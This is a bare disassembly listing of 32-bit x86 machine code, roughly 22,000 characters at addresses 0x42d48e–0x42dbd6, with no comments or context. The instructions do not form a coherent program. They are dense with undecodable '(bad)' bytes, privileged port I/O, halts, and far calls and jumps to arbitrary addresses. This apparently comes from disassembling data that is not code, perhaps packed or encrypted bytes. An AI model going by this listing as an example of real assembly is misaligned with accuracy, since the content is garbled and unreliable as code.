  42d48e:	cmp    dl,BYTE PTR [ebp+0x66eab91b]
  42d494:	dec    ebp
  42d495:	pop    ecx
  42d496:	push   0x46
  42d498:	push   ebx
  42d499:	sbb    al,BYTE PTR ds:0xee94d5cd
  42d49f:	in     al,dx
  42d4a0:	fbstp  TBYTE PTR [ebx+0x191ee64d]
  42d4a6:	icebp  
  42d4a7:	shl    BYTE PTR [edi-0x1b8cb3f],1
  42d4ad:	or     al,0x7c
  42d4af:	pop    edx
  42d4b0:	aam    0x50
  42d4b2:	hlt    
  42d4b3:	popa   
  42d4b4:	jnp    0x42d464
  42d4b6:	mov    ebp,gs
  42d4b8:	sbb    cl,cl
  42d4ba:	xchg   DWORD PTR [eax+eiz*1-0x5f6f96bf],edx
  42d4c1:	call   0x70b4:0x28841db
  42d4c8:	push   esi
  42d4c9:	inc    ebp
  42d4ca:	mov    edi,0xd6173c17
  42d4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4d0:	stos   DWORD PTR es:[edi],eax
  42d4d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4d2:	push   ebx
  42d4d3:	xchg   ecx,eax
  42d4d4:	(bad)  
  42d4d5:	out    dx,al
  42d4d6:	jle    0x42d495
  42d4d8:	sbb    eax,0x936b4c82
  42d4dd:	dec    esp
  42d4de:	xor    ch,dl
  42d4e0:	and    al,0x3d
  42d4e2:	lods   eax,DWORD PTR ds:[esi]
  42d4e3:	jmp    0x42d488
  42d4e5:	or     DWORD PTR [ebx+0x49],ebp
  42d4e8:	pop    ecx
  42d4e9:	pop    ebx
  42d4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4eb:	mov    dh,0x4d
  42d4ed:	and    ebp,ebp
  42d4ef:	(bad)  
  42d4f0:	fisub  WORD PTR [edx]
  42d4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4f3:	cdq    
  42d4f4:	mov    ebx,0x4ca31ba8
  42d4f9:	mov    edi,0x4b4dea1e
  42d4fe:	sbb    ecx,esi
  42d500:	xchg   BYTE PTR ds:0xc152a4b5,dh
  42d506:	fwait
  42d507:	mov    eax,ds:0xeeb86b55
  42d50c:	mov    edx,0x1bdd5019
  42d511:	aaa    
  42d512:	ret    
  42d513:	dec    esi
  42d514:	mov    ebx,0xf6f4b043
  42d519:	pop    esi
  42d51a:	rcr    ebp,0xc5
  42d51d:	lods   eax,DWORD PTR ds:[esi]
  42d51e:	mov    dh,dl
  42d520:	adc    al,0x2
  42d522:	fldcw  WORD PTR ds:0x430e79fa
  42d528:	push   0x2a0539a1
  42d52d:	inc    esp
  42d52e:	pushf  
  42d52f:	dec    edx
  42d530:	xchg   ebp,eax
  42d531:	cmp    BYTE PTR [edx],bh
  42d533:	repnz call 0x8319:0x24f6a7a7
  42d53b:	mov    dl,0x8f
  42d53d:	retf   0x6c5f
  42d540:	xlat   BYTE PTR ds:[ebx]
  42d541:	(bad)  
  42d542:	in     al,dx
  42d543:	push   ss
  42d544:	not    BYTE PTR es:[ecx-0x55]
  42d548:	mov    ebx,0x25bf2af3
  42d54d:	xchg   ebp,eax
  42d54e:	gs (bad) 
  42d550:	xchg   ebp,eax
  42d551:	add    al,0x7d
  42d553:	sbb    dh,0x83
  42d556:	in     al,dx
  42d557:	(bad)  
  42d558:	repz test al,0xaf
  42d55b:	(bad)  
  42d55c:	sar    BYTE PTR [esp+edi*2],cl
  42d55f:	outs   dx,BYTE PTR ds:[esi]
  42d560:	push   ss
  42d561:	imul   ebx,DWORD PTR [eax-0x601a50be],0x2f681109
  42d56b:	sti    
  42d56c:	and    eax,0x6319b051
  42d571:	repz inc esp
  42d573:	(bad)  
  42d574:	dec    esp
  42d575:	jns    0x42d5e0
  42d577:	inc    ebx
  42d578:	lods   al,BYTE PTR ds:[esi]
  42d579:	or     al,0x8e
  42d57b:	je     0x42d53c
  42d57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d57e:	test   DWORD PTR [ebx],esp
  42d580:	das    
  42d581:	jge    0x42d54f
  42d583:	or     eax,0xa85aba8b
  42d588:	jnp    0x42d5d9
  42d58a:	mov    ebx,0xa0092480
  42d58f:	push   ds
  42d590:	xor    eax,0x2c82153f
  42d595:	mov    al,ds:0x24ba842b
  42d59a:	or     eax,0x75d36489
  42d59f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5a0:	rcl    BYTE PTR [edx],cl
  42d5a2:	in     al,dx
  42d5a3:	hlt    
  42d5a4:	push   esp
  42d5a5:	and    eax,0x9b3f43d4
  42d5aa:	imul   esi,DWORD PTR [esi-0x7a],0xffffffb0
  42d5ae:	adc    eax,0x526d0025
  42d5b3:	sub    al,0x4d
  42d5b5:	jl     0x42d570
  42d5b7:	fs inc esp
  42d5b9:	inc    ebx
  42d5ba:	mov    al,ds:0x4450a88a
  42d5bf:	mov    al,0x25
  42d5c1:	aaa    
  42d5c2:	aam    0xe8
  42d5c4:	sbb    eax,0x10f2b7fd
  42d5c9:	out    0xb4,eax
  42d5cb:	xchg   esp,eax
  42d5cc:	pop    sp
  42d5ce:	sbb    ah,BYTE PTR [ebx]
  42d5d0:	ss push 0xfffffff5
  42d5d3:	sbb    BYTE PTR [ebx],cl
  42d5d5:	ds std 
  42d5d7:	inc    edi
  42d5d8:	and    DWORD PTR [esi+0x39],esi
  42d5db:	adc    ecx,0x74
  42d5de:	mov    dl,0x34
  42d5e0:	mov    esi,0x15ddb35f
  42d5e5:	mov    gs,esp
  42d5e7:	out    0x43,al
  42d5e9:	pop    es
  42d5ea:	cdq    
  42d5eb:	icebp  
  42d5ec:	sbb    BYTE PTR [ecx+0x72f54b16],ch
  42d5f2:	xchg   esi,eax
  42d5f3:	xor    bl,BYTE PTR [edx]
  42d5f5:	mov    ds:0xf8ac918b,eax
  42d5fa:	sub    BYTE PTR [ecx],dl
  42d5fc:	outs   dx,BYTE PTR ds:[esi]
  42d5fd:	mov    esp,0xb3d1a8c4
  42d602:	mov    dh,0x34
  42d604:	pop    ebx
  42d605:	push   ss
  42d606:	pop    ebx
  42d607:	or     BYTE PTR [ebp+0x76ec131b],al
  42d60d:	cmp    al,0x12
  42d60f:	fistp  DWORD PTR [edx]
  42d611:	cmp    ecx,esp
  42d613:	inc    dx
  42d615:	sbb    BYTE PTR [ecx+0x5bd13133],al
  42d61b:	icebp  
  42d61c:	or     edx,DWORD PTR [eax+ebx*4]
  42d61f:	pop    ds
  42d620:	sub    BYTE PTR [ecx],ah
  42d622:	dec    edx
  42d623:	xchg   esp,eax
  42d624:	sub    BYTE PTR [ebx-0x26],al
  42d627:	in     eax,0xb8
  42d629:	sbb    eax,0x7baaa4b6
  42d62e:	aas    
  42d62f:	mov    ds:0xee9a2d85,al
  42d634:	in     eax,dx
  42d635:	je     0x42d623
  42d637:	cld    
  42d638:	xlat   BYTE PTR ds:[ebx]
  42d639:	stos   BYTE PTR es:[edi],al
  42d63a:	in     al,0x40
  42d63c:	test   BYTE PTR [esi-0x4a],bh
  42d63f:	pop    ds
  42d640:	pop    ebx
  42d641:	jmp    0x933b:0xa5f384bb
  42d648:	adc    ecx,esp
  42d64a:	add    BYTE PTR [edi],0xf2
  42d64d:	stc    
  42d64e:	mov    al,ds:0xbc621724
  42d653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d654:	mov    bl,0xc7
  42d656:	mov    bh,0xdf
  42d658:	mov    ch,0xa7
  42d65a:	xchg   ebx,eax
  42d65b:	inc    DWORD PTR [ecx+0x7e]
  42d65e:	sbb    esp,DWORD PTR [ecx+0x6bd25bf2]
  42d664:	pop    eax
  42d665:	dec    ebx
  42d666:	loope  0x42d6bd
  42d668:	cmp    ch,dl
  42d66a:	mov    al,0xe4
  42d66c:	push   0xffffff99
  42d66e:	jmp    0x42d67e
  42d670:	les    ebp,FWORD PTR [ebx]
  42d672:	or     DWORD PTR [ecx+edi*4],ebp
  42d675:	das    
  42d676:	int3   
  42d677:	xchg   edi,eax
  42d678:	cmp    al,0x8a
  42d67a:	mov    ebx,0xdc73f924
  42d67f:	out    0xf5,al
  42d681:	fidiv  WORD PTR [esi+0x171978f2]
  42d687:	mov    edi,?
  42d689:	fstp   DWORD PTR [ecx]
  42d68b:	lock cmp al,0xa6
  42d68e:	idiv   ebx
  42d690:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d692:	(bad)  
  42d693:	cwde   
  42d694:	mov    ch,0xe5
  42d696:	cmp    eax,0xe0ba15e5
  42d69b:	rol    DWORD PTR [eax+0x19],0xf3
  42d69f:	out    dx,eax
  42d6a0:	sbb    bh,ah
  42d6a2:	(bad)  
  42d6a3:	push   0x69
  42d6a5:	fist   WORD PTR [edi]
  42d6a7:	lock (bad) 
  42d6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6aa:	test   al,0x2
  42d6ac:	clc    
  42d6ad:	add    al,al
  42d6af:	or     DWORD PTR [edx+edx*1],edx
  42d6b2:	xcrypt-cfb (bad)
  42d6b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6b4:	mov    al,ds:0x66262c72
  42d6b9:	xor    eax,0xa54884b3
  42d6be:	(bad)  [ebx+0x6e]
  42d6c1:	out    dx,al
  42d6c2:	in     al,dx
  42d6c3:	add    eax,0xe02e353b
  42d6c8:	xchg   BYTE PTR [ebx-0x47],al
  42d6cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d6cc:	mov    esp,0x763c5a72
  42d6d1:	jb     0x42d65b
  42d6d3:	pop    ecx
  42d6d4:	push   0xffffffa7
  42d6d6:	stos   DWORD PTR es:[edi],eax
  42d6d7:	aam    0x28
  42d6d9:	mov    ah,0x21
  42d6db:	xlat   BYTE PTR ds:[ebx]
  42d6dc:	pop    ds
  42d6dd:	add    esp,eax
  42d6df:	xor    al,0x70
  42d6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d6e2:	popw   es
  42d6e4:	in     eax,0x68
  42d6e6:	adc    BYTE PTR [edx+0x22],dh
  42d6e9:	sbb    edi,edi
  42d6eb:	or     edi,eax
  42d6ed:	lahf   
  42d6ee:	out    dx,eax
  42d6ef:	pusha  
  42d6f0:	rcl    DWORD PTR [eax-0x7b0d48d],0xf5
  42d6f7:	inc    esi
  42d6f8:	xchg   esp,eax
  42d6f9:	push   ebp
  42d6fa:	mov    dh,0x44
  42d6fc:	mov    bl,0xa0
  42d6fe:	fwait
  42d6ff:	dec    edi
  42d700:	fmul   QWORD PTR [edi-0x524f9caa]
  42d706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d707:	bound  ecx,QWORD PTR [esi-0x2f3b4ba8]
  42d70d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d70e:	icebp  
  42d70f:	mov    eax,DWORD PTR ds:0x43e8dbb0
  42d715:	or     DWORD PTR [edx-0x5fc6e19b],edx
  42d71b:	adc    DWORD PTR [ecx],eax
  42d71d:	mov    ebp,0xab6da4fe
  42d722:	mov    edi,DWORD PTR [ecx+0x773971e6]
  42d728:	mov    ds:0x2a29cade,eax
  42d72d:	imul   edi,DWORD PTR [esi],0xe76e72cd
  42d733:	lahf   
  42d734:	push   ds
  42d735:	lods   al,BYTE PTR ds:[esi]
  42d736:	aam    0xf
  42d738:	push   ss
  42d739:	pop    ds
  42d73a:	push   eax
  42d73b:	(bad)  
  42d73c:	mov    WORD PTR [ebp-0x6590be66],?
  42d742:	out    0x5b,al
  42d744:	mov    eax,0xd09b7898
  42d749:	ins    DWORD PTR es:[edi],dx
  42d74a:	sbb    eax,esi
  42d74c:	xchg   BYTE PTR [esp+esi*4],dl
  42d74f:	les    ebx,FWORD PTR [edx-0x25c6e461]
  42d755:	mov    DWORD PTR [edi],esi
  42d757:	call   0x89309bda
  42d75c:	das    
  42d75d:	dec    edi
  42d75e:	mov    ch,0xd4
  42d760:	xchg   edx,eax
  42d761:	and    BYTE PTR [ecx-0x1e],0xb5
  42d765:	popf   
  42d766:	mov    ecx,0xed0ebaea
  42d76b:	out    dx,al
  42d76c:	sbb    BYTE PTR [ecx+0x10],bl
  42d76f:	xchg   ebp,eax
  42d770:	dec    ebp
  42d771:	or     DWORD PTR [edi+0x78],ebx
  42d774:	arpl   WORD PTR [ecx+0x28a0512b],sp
  42d77a:	ret    
  42d77b:	jne    0x42d7d5
  42d77d:	aad    0xe5
  42d77f:	out    dx,eax
  42d780:	loopne 0x42d77e
  42d782:	mov    esp,0xc83eeaa4
  42d787:	shr    BYTE PTR [ecx-0x6c],0x23
  42d78b:	ror    ah,1
  42d78d:	hlt    
  42d78e:	jecxz  0x42d784
  42d790:	out    0xa0,al
  42d792:	fucomip st,st(1)
  42d794:	lds    esp,FWORD PTR [si]
  42d797:	mov    ch,0xb0
  42d799:	shr    BYTE PTR [ebx],1
  42d79b:	aad    0xf6
  42d79d:	stos   BYTE PTR es:[edi],al
  42d79e:	sub    BYTE PTR [ebx-0x5a],dl
  42d7a1:	test   DWORD PTR [ecx],esi
  42d7a3:	jns    0x42d776
  42d7a5:	jecxz  0x42d7d6
  42d7a7:	repz mov ch,0xab
  42d7aa:	push   ss
  42d7ab:	repz push esp
  42d7ad:	imul   DWORD PTR [edx-0x6de6dd96]
  42d7b3:	(bad)  
  42d7b4:	add    BYTE PTR [edi-0x6543fa08],ah
  42d7ba:	mov    ebx,0x8f8090cf
  42d7bf:	mov    cs,WORD PTR [ebp-0x2eab95a3]
  42d7c5:	shl    DWORD PTR [ebp-0x70bea58c],cl
  42d7cb:	and    eax,0xaa152379
  42d7d0:	or     cl,dl
  42d7d2:	adc    DWORD PTR [eax],0xb1719d18
  42d7d8:	fdecstp 
  42d7da:	sar    BYTE PTR [eax],0xc2
  42d7dd:	cmp    esp,esp
  42d7df:	mov    dl,0xed
  42d7e1:	(bad)  
  42d7e3:	test   BYTE PTR [esp+edx*2],ah
  42d7e6:	test   DWORD PTR [esi],ebp
  42d7e8:	iret   
  42d7e9:	ret    0x6a6e
  42d7ec:	xor    eax,0xd4e6704d
  42d7f1:	xor    al,0xab
  42d7f3:	dec    esi
  42d7f4:	and    ebx,DWORD PTR [ecx]
  42d7f6:	nop
  42d7f7:	sbb    DWORD PTR [ebx+0x57],ecx
  42d7fa:	cs inc ebp
  42d7fc:	sbb    BYTE PTR [ebp-0x13],0x48
  42d800:	mov    bl,0xa3
  42d802:	jnp    0x42d83f
  42d804:	in     al,dx
  42d805:	or     BYTE PTR [edx+ecx*2-0x7be256e6],0x6c
  42d80d:	stos   BYTE PTR es:[edi],al
  42d80e:	repnz sub esi,DWORD PTR [ecx]
  42d811:	(bad)  
  42d812:	sub    al,0x37
  42d814:	adc    al,0xe0
  42d816:	xor    eax,0xb36a41e4
  42d81b:	and    bl,BYTE PTR [edx]
  42d81d:	dec    ecx
  42d81e:	lods   al,BYTE PTR ds:[esi]
  42d81f:	in     eax,0x3c
  42d821:	je     0x42d843
  42d823:	xor    eax,0xf2cba1e4
  42d828:	cmp    eax,0xf92422c
  42d82d:	push   0xffffff83
  42d82f:	push   ss
  42d830:	cdq    
  42d831:	fidiv  WORD PTR [edx-0x7e69a07c]
  42d837:	push   ebp
  42d838:	cmc    
  42d839:	mov    ds:0xbab1ecaa,al
  42d83e:	xlat   BYTE PTR ds:[ebx]
  42d83f:	cwde   
  42d840:	and    eax,0x384ef799
  42d845:	sub    BYTE PTR [ecx+0x66],dl
  42d848:	adc    al,0x63
  42d84a:	dec    edi
  42d84b:	inc    ecx
  42d84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d84d:	mov    al,ds:0x4028f1eb
  42d852:	test   ah,0x61
  42d855:	je     0x42d860
  42d857:	pop    esi
  42d858:	dec    eax
  42d859:	mov    cl,0xba
  42d85b:	inc    esp
  42d85c:	or     DWORD PTR [edx+0x4d35fe81],ecx
  42d862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d863:	icebp  
  42d864:	inc    esi
  42d865:	inc    esi
  42d866:	fs dec ecx
  42d868:	and    DWORD PTR [ecx-0x34b42b55],edi
  42d86e:	xor    al,0x8e
  42d870:	loop   0x42d857
  42d872:	push   edx
  42d873:	popa   
  42d874:	add    eax,0x38e640c7
  42d879:	jno    0x42d8e8
  42d87b:	jnp    0x42d80a
  42d87d:	dec    ecx
  42d87e:	cwde   
  42d87f:	jne    0x42d86c
  42d881:	aad    0xf8
  42d883:	out    dx,eax
  42d884:	xor    eax,0xb5cfb7a9
  42d889:	enter  0xebaf,0x9a
  42d88d:	pop    edx
  42d88e:	push   es
  42d88f:	addr16 xchg ecx,eax
  42d891:	dec    ecx
  42d892:	jns    0x42d90d
  42d894:	dec    ebp
  42d895:	xchg   edx,eax
  42d896:	and    BYTE PTR [esi],ch
  42d898:	gs push esi
  42d89a:	mov    edx,0x759a377a
  42d89f:	fisub  DWORD PTR ds:0x3a710559
  42d8a5:	cmp    al,0x8b
  42d8a7:	call   0x2ae8c1ce
  42d8ac:	jne    0x42d876
  42d8ae:	inc    eax
  42d8af:	add    ch,BYTE PTR [edx-0x69204459]
  42d8b5:	pop    esp
  42d8b6:	push   ebx
  42d8b7:	rcl    BYTE PTR [ecx],cl
  42d8b9:	in     al,dx
  42d8ba:	inc    ecx
  42d8bb:	mov    ch,BYTE PTR [esi]
  42d8bd:	mov    esp,ecx
  42d8bf:	or     esi,DWORD PTR [ebp+0x6e]
  42d8c2:	pop    ecx
  42d8c3:	xor    eax,0xa5da0761
  42d8c8:	dec    ebp
  42d8c9:	lahf   
  42d8ca:	mov    ebx,0x157db39d
  42d8cf:	jg     0x42d8f4
  42d8d1:	mov    edi,0x9a4ece4d
  42d8d6:	loopne 0x42d8cc
  42d8d8:	call   0xdba0:0x66d2aa7
  42d8df:	pushf  
  42d8e0:	and    BYTE PTR [ebx-0x6c],ch
  42d8e3:	and    al,0x6c
  42d8e5:	xor    DWORD PTR [ebx+0x4d],edi
  42d8e8:	inc    eax
  42d8e9:	lea    edi,[ebp+0xeb60504]
  42d8ef:	imul   esp,DWORD PTR ds:0xdeef1960,0xffffffe3
  42d8f6:	shl    BYTE PTR [ecx+ecx*4+0x514cd1d9],1
  42d8fd:	push   0x0
  42d8ff:	jns    0x42d958
  42d901:	and    ch,dl
  42d903:	add    al,0xa0
  42d905:	mul    BYTE PTR [edx+0x39c2d5bd]
  42d90b:	std    
  42d90c:	mov    esi,0x42eb2a3b
  42d911:	js     0x42d991
  42d913:	xacquire xchg DWORD PTR [esi-0x44],ecx
  42d917:	fs mov ebx,0x650bf944
  42d91d:	and    BYTE PTR [esi],dl
  42d91f:	out    dx,eax
  42d920:	(bad)  
  42d921:	pop    es
  42d922:	in     eax,dx
  42d923:	jbe    0x42d957
  42d925:	stc    
  42d926:	and    DWORD PTR [ebx-0x19],edi
  42d929:	(bad)  
  42d92a:	scas   al,BYTE PTR es:[edi]
  42d92b:	pop    edx
  42d92c:	arpl   WORD PTR [esi+0x24],ax
  42d92f:	dec    ebp
  42d930:	(bad)  
  42d931:	xchg   ebp,eax
  42d932:	leave  
  42d933:	push   ds
  42d934:	jg     0x42d920
  42d936:	cli    
  42d937:	fwait
  42d938:	add    DWORD PTR [edi+0x7e],edx
  42d93b:	inc    DWORD PTR [edx+0x1264f8c3]
  42d941:	sar    DWORD PTR [ebp-0x7d6a10ec],1
  42d947:	test   eax,0xdf26f3a6
  42d94c:	and    DWORD PTR ds:0x84e52cb,ebx
  42d952:	popa   
  42d953:	sbb    DWORD PTR [ebp-0x53],edx
  42d956:	mov    dh,0x74
  42d958:	data16 sbb al,0x8c
  42d95b:	dec    ebp
  42d95c:	mov    ch,0xa8
  42d95e:	scas   al,BYTE PTR es:[edi]
  42d95f:	out    dx,eax
  42d960:	inc    eax
  42d961:	mov    dh,0x9d
  42d963:	test   DWORD PTR [ecx-0x27],ebx
  42d966:	shl    ch,cl
  42d968:	pop    ss
  42d969:	xor    al,0x47
  42d96b:	add    ecx,DWORD PTR [ebp+0x76ed244e]
  42d971:	(bad)  
  42d972:	mov    bl,0xa3
  42d974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d975:	popf   
  42d976:	adc    BYTE PTR [edi],dl
  42d978:	sbb    DWORD PTR [eax],ebp
  42d97a:	les    ebp,FWORD PTR [ebx]
  42d97c:	lock and DWORD PTR [esi-0x70],0xc0bc4cff
  42d984:	push   ebp
  42d985:	add    al,0xbc
  42d987:	inc    ebp
  42d988:	jp     0x42d96c
  42d98a:	xor    BYTE PTR ds:0xac3229fb,0xb2
  42d991:	mov    eax,ds:0x8e12fe7f
  42d996:	add    cl,ch
  42d998:	cmc    
  42d999:	xchg   esi,eax
  42d99a:	mov    esi,0xf75800e5
  42d99f:	jo     0x42d9bd
  42d9a1:	or     DWORD PTR [esi-0x4f473348],ebp
  42d9a7:	mov    ds:0x8aaba0aa,al
  42d9ac:	inc    esi
  42d9ad:	or     edx,DWORD PTR [eax]
  42d9af:	aam    0xbe
  42d9b1:	inc    esi
  42d9b2:	sbb    ecx,ebx
  42d9b4:	dec    ecx
  42d9b5:	inc    esp
  42d9b6:	jae    0x42d9be
  42d9b8:	sar    al,1
  42d9ba:	mov    dl,0xac
  42d9bc:	aam    0x9a
  42d9be:	or     ecx,DWORD PTR [esi]
  42d9c0:	sub    esi,DWORD PTR [esi]
  42d9c2:	popf   
  42d9c3:	mov    edi,0x3f6b0870
  42d9c8:	adc    BYTE PTR [eax],dl
  42d9ca:	jmp    0x42d950
  42d9cc:	inc    eax
  42d9cd:	test   al,0xc6
  42d9cf:	or     BYTE PTR [edi+ebx*4-0x75],dl
  42d9d3:	pop    ebp
  42d9d4:	push   ebx
  42d9d5:	push   ss
  42d9d6:	call   0x3658009e
  42d9db:	(bad)  
  42d9dc:	xchg   esp,eax
  42d9dd:	lock ret 0x6a73
  42d9e1:	aas    
  42d9e2:	mov    ds:0x155d37d5,eax
  42d9e7:	in     eax,0x5a
  42d9e9:	dec    esp
  42d9ea:	xor    eax,0xffffffdd
  42d9ed:	mov    eax,ds:0xd036005b
  42d9f2:	div    DWORD PTR [ebp+0x68]
  42d9f5:	pop    ebx
  42d9f6:	lock out 0xb4,al
  42d9f9:	cmp    ah,BYTE PTR [edx]
  42d9fb:	mov    ch,0x1e
  42d9fd:	aas    
  42d9fe:	dec    ebp
  42d9ff:	std    
  42da00:	add    DWORD PTR [edx+0x73f9b7ad],ecx
  42da06:	retf   
  42da07:	sub    BYTE PTR [ecx-0x6e9b4791],dh
  42da0d:	cmp    cl,bl
  42da0f:	sar    DWORD PTR [edi-0x40eb4ddf],1
  42da15:	test   eax,0x29c5574a
  42da1a:	arpl   si,bp
  42da1c:	(bad)  
  42da1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da1e:	shl    BYTE PTR [esi+0x16],1
  42da21:	pop    ecx
  42da22:	int    0x6
  42da24:	sub    BYTE PTR [esi],bl
  42da26:	fcomp  DWORD PTR [esi-0x4e]
  42da29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da2a:	jnp    0x42d9f5
  42da2c:	inc    esi
  42da2d:	sbb    eax,0x1aa78a35
  42da32:	and    edi,DWORD PTR [edi]
  42da34:	(bad)  
  42da35:	div    DWORD PTR [esi-0x579c962c]
  42da3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da3c:	mov    ch,0xd1
  42da3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da3f:	call   0xc38a833e
  42da44:	push   esp
  42da45:	stc    
  42da46:	rol    BYTE PTR [eax],0xf
  42da49:	pop    esp
  42da4a:	mov    WORD PTR [ecx+0xf],?
  42da4d:	test   BYTE PTR [edi],ch
  42da4f:	jmp    0x42d9e6
  42da51:	test   DWORD PTR [edx],edx
  42da53:	out    dx,al
  42da54:	push   esp
  42da55:	add    cl,BYTE PTR [ecx]
  42da57:	adc    al,0x39
  42da59:	test   eax,0x4d8f3d40
  42da5e:	jnp    0x42dab6
  42da60:	xor    al,0xe9
  42da62:	fld    QWORD PTR [ecx]
  42da64:	cmp    ebp,DWORD PTR [ebx-0x4f6a7c4e]
  42da6a:	push   es
  42da6b:	jmp    0xcbfe575e
  42da70:	sahf   
  42da71:	sahf   
  42da72:	push   ecx
  42da73:	nop
  42da74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da75:	mov    dh,0x88
  42da77:	test   edx,0xbb435a73
  42da7d:	into   
  42da7e:	cld    
  42da7f:	jo     0x42da09
  42da81:	cdq    
  42da82:	stos   DWORD PTR es:[edi],eax
  42da83:	pusha  
  42da84:	aas    
  42da85:	(bad)  
  42da86:	add    al,0x36
  42da88:	sbb    eax,0x73139a49
  42da8d:	xlat   BYTE PTR ds:[ebx]
  42da8e:	es cdq 
  42da90:	pop    edi
  42da91:	mov    bl,0x4b
  42da93:	sbb    DWORD PTR [edi],0x7ef11560
  42da99:	jecxz  0x42dac4
  42da9b:	mov    ebp,0x8db8c04
  42daa0:	inc    edi
  42daa1:	fmul   QWORD PTR [ebx-0x25]
  42daa4:	shl    BYTE PTR [ecx],cl
  42daa6:	out    dx,eax
  42daa7:	in     eax,0xb5
  42daa9:	in     al,0x22
  42daab:	jmp    0x9b2a1f0
  42dab0:	and    eax,0x88b0c5e9
  42dab5:	into   
  42dab6:	add    ch,BYTE PTR [ebx+0x5a]
  42dab9:	(bad)  
  42daba:	pop    ebx
  42dabb:	sub    cl,ah
  42dabd:	lds    edx,FWORD PTR [edi-0x23f7e75c]
  42dac3:	xlat   BYTE PTR ds:[ebx]
  42dac4:	push   ss
  42dac5:	jmp    0x8d2b9304
  42daca:	sbb    esi,eax
  42dacc:	push   edi
  42dacd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dace:	imul   edx,ebx,0x30
  42dad1:	mov    al,ds:0x2ee18040
  42dad6:	sti    
  42dad7:	pop    eax
  42dad8:	in     al,0x9a
  42dada:	push   esp
  42dadb:	xchg   esp,eax
  42dadc:	and    ebx,DWORD PTR [ecx-0x68896d57]
  42dae2:	(bad)  
  42dae3:	xor    ah,ch
  42dae5:	mov    cl,0x50
  42dae7:	jmp    0x42da69
  42dae9:	outs   dx,BYTE PTR ds:[esi]
  42daea:	pushf  
  42daeb:	sar    eax,1
  42daed:	test   eax,0xa6d0f855
  42daf2:	inc    ebp
  42daf3:	jecxz  0x42db38
  42daf5:	mov    ?,WORD PTR [ebx-0x4f796af2]
  42dafb:	in     eax,dx
  42dafc:	sub    al,0x79
  42dafe:	loop   0x42da9c
  42db00:	and    edi,DWORD PTR [edi*1+0x46c81c8d]
  42db07:	mov    ?,WORD PTR ds:0xd8e7d1f5
  42db0d:	jp     0x42db34
  42db0f:	sbb    bh,ch
  42db11:	jmp    0x42db83
  42db13:	jle    0x42db2d
  42db15:	mov    ecx,0xf474572b
  42db1a:	fcomi  st,st(6)
  42db1c:	xor    eax,0x61e51042
  42db21:	fmul   st(3),st
  42db23:	pop    eax
  42db24:	jle    0x42dac0
  42db26:	out    0x8c,al
  42db28:	stc    
  42db29:	jp     0x42db6a
  42db2b:	and    bl,al
  42db2d:	or     dh,BYTE PTR [esp+ecx*8-0x25c45dc1]
  42db34:	inc    ecx
  42db35:	push   0x54
  42db37:	ror    BYTE PTR [edi+edi*2+0x2d],1
  42db3b:	fwait
  42db3c:	pusha  
  42db3d:	fidiv  DWORD PTR [ebp+0x5948ea14]
  42db43:	mov    fs,ebp
  42db45:	add    dl,BYTE PTR [eax+esi*8]
  42db48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db49:	pusha  
  42db4a:	push   0x19
  42db4c:	and    bh,BYTE PTR [ecx+0x15]
  42db4f:	xor    DWORD PTR [edi+0xdca8af8],eax
  42db55:	mov    eax,ds:0x2ecc4f0b
  42db5a:	jne    0x42db90
  42db5c:	sbb    eax,DWORD PTR [edi+eax*1-0x43ad891a]
  42db63:	je     0x42db52
  42db65:	xchg   edx,eax
  42db66:	cmp    edx,DWORD PTR [ebx]
  42db68:	out    0x61,eax
  42db6a:	mov    al,ds:0xee3ac1be
  42db6f:	out    0x7d,al
  42db71:	mov    eax,ds
  42db73:	int    0xb6
  42db75:	and    DWORD PTR [edx],0xccd52ec5
  42db7b:	push   ds
  42db7c:	test   al,0x36
  42db7e:	adc    ecx,DWORD PTR [edi]
  42db80:	and    edi,DWORD PTR [edi-0x47]
  42db83:	sub    al,0xe2
  42db85:	sub    ecx,DWORD PTR [ebx+0xff6d1e9]
  42db8b:	adc    eax,0x43cb8916
  42db90:	arpl   WORD PTR [ecx],di
  42db92:	xlat   BYTE PTR ds:[ebx]
  42db93:	push   edi
  42db94:	inc    ebp
  42db95:	call   0x841d:0xda56f0be
  42db9c:	std    
  42db9d:	stc    
  42db9e:	cmp    eax,0x3d9df442
  42dba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dba4:	jno    0x42dbc0
  42dba6:	mov    cl,ch
  42dba8:	aaa    
  42dba9:	push   eax
  42dbaa:	test   BYTE PTR [edx*4+0x2ff0b2f2],bl
  42dbb1:	adc    DWORD PTR [ebp+eiz*1-0x7ad993a7],ebx
  42dbb8:	and    esp,edx
  42dbba:	fwait
  42dbbb:	out    0xb9,eax
  42dbbd:	call   0x9c57:0x2b83625b
  42dbc4:	push   edx
  42dbc5:	add    al,0xac
  42dbc7:	jmp    0xf7c0acb5
  42dbcc:	pop    es
  42dbcd:	in     al,0xba
  42dbcf:	(bad)  
  42dbd0:	xlat   BYTE PTR ds:[ebx]
  42dbd1:	mov    al,ds:0x62f5065b
  42dbd6:	mov    BYTE PTR [ebp+0x64],al
